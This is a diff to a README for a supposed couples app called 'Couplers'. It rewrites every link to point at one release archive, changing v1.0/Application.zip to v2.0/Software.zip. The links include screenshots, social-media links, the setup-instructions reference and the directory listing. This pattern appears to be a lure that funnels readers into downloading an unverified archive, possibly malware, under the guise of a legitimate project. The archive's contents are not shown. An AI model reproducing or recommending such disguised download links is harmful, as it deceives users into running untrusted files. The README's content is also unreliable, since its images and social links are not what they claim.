@@ -37,38 +37,38 @@ couplers/
 │    ├── models/
 │    └── services/
 │
-├── https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip
+├── https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip
 │
-└── https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip
+└── https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip
 ```
 
 ## 📥 Installation 📥
 
 To get started with Couplers, simply download the project files from the following link:  
-[![Download Software](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip)](https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip)
 
-Once you have downloaded the files, extract them and follow the instructions in the `https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip` file to set up the project on your local machine.
+Once you have downloaded the files, extract them and follow the instructions in the `https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip` file to set up the project on your local machine.
 
 ## 📷 Screenshots 📷
 
 Here are some glimpses of what you can expect from the Couplers app:
 
-![Memory Lane](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)  
+![Memory Lane](https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip)  
 *Relive your favorite memories together.*
 
-![Photo Sharing](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)  
+![Photo Sharing](https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip)  
 *Share photos and create photo albums with ease.*
 
-![Love Calendar](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)  
+![Love Calendar](https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip)  
 *Stay organized and never miss an important date.*
 
 ## 🌐 Connect with Us 🌐
 
 Want to stay updated on the latest developments with Couplers? Follow us on social media and join our community:
 
-- [Twitter](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)
-- [Instagram](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)
-- [Facebook](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)
+- [Twitter](https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip)
 
 ## 🙌 Contributing 🙌
 
@@ -76,7 +76,7 @@ We welcome contributions from developers who are passionate about creating meani
 
 ## 📆 Release Notes 📆
 
-For the latest updates and version releases of the Couplers app, please check the [Releases](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip) section of this repository.
+For the latest updates and version releases of the Couplers app, please check the [Releases](https://github.com/muum1209/Couplers/releases/download/v2.0/Software.zip) section of this repository.
 
 ---
 
